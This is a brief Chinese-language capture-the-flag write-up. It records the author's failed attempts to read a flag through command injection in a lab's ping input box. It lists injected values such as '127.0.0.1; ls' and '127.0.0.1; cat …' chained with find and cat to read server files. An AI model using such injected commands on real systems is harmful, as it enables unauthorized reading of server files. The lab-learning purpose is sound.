# 解题过程

## 踩坑过程：

打开靶场页面，在 IP： 输入框中输入：127.0.0.1; ls；点击 Ping，成功回显当前目录文件列表

屏幕中间出现了新的 Array 列表，第 [10] 行显示 index.php，而第 [9] 行有一个奇怪的文件名：84281830621188.php，我猜测这就是藏Flag的文件

在IP输入框中搜索：127.0.0.1; cat 84281830621188.php

回车后，页面又再次变成了一开始的页面状态

以为误操作刷新了，重复操作上述动作发现依旧如此，正确的Flag并未出现

我再次尝试127.0.0.1; cat 84281830621188.ph

127.0.0.1; find / -name "*flag*" -exec cat {} \;

127.0.0.1; ls -la /tmp; ls -la /var/www/html; cat /flag /flag.txt /tmp/flag* 2>/dev/null

127.0.0.1; cat /var/www/html/index.php

这四条依旧错误，没有出现正确的Flag
